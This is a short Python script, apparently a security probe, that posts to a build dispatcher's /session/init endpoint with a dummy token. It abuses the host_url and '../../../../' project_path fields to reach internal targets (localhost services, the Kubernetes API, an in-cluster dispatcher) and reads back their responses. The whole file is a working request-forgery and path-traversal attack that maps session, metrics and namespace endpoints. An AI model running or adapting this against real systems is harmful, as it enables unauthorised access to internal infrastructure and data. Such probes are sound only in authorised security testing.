import json,os,time,urllib.request,urllib.error
B=os.environ['BUILDMODE_DISPATCHER_URL']; U='snapgpt-kube-probe-20261106@armorerlabs.com'
C=[('lh','http://127.0.0.1:8080','../../../../health'),('lo','http://127.0.0.1:8080','../../../../openapi.json'),('lm','http://127.0.0.1:8080','../../../../metrics'),('ll','http://127.0.0.1:8080','../../../../llm/health'),('ls','http://127.0.0.1:8080','../../../../sessions'),('kh','http://kubernetes.default.svc','../../../../version'),('kn','http://kubernetes.default.svc','../../../../api/v1/namespaces'),('ks','http://kubernetes.default.svc','../../../../healthz'),('kt','https://kubernetes.default.svc','../../../../version'),('dt','http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local','../../../../health')]
for n,h,p in C:
 d=json.dumps({'user_id':U,'host_url':h,'project_path':p,'force':True},separators=(',',':')).encode(); r=urllib.request.Request(B+'/session/init',data=d,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'}); t=time.monotonic()
 try:
  with urllib.request.urlopen(r,timeout=20) as x: s=x.status; b=x.read(2000).decode('utf-8','replace')
 except urllib.error.HTTPError as e: s=e.code; b=e.read(2000).decode('utf-8','replace')
 except Exception as e: s='ERR'; b=repr(e)
 print(json.dumps({'n':n,'h':h,'p':p,'s':s,'b':b,'t':round(time.monotonic()-t,3)},separators=(',',':')))
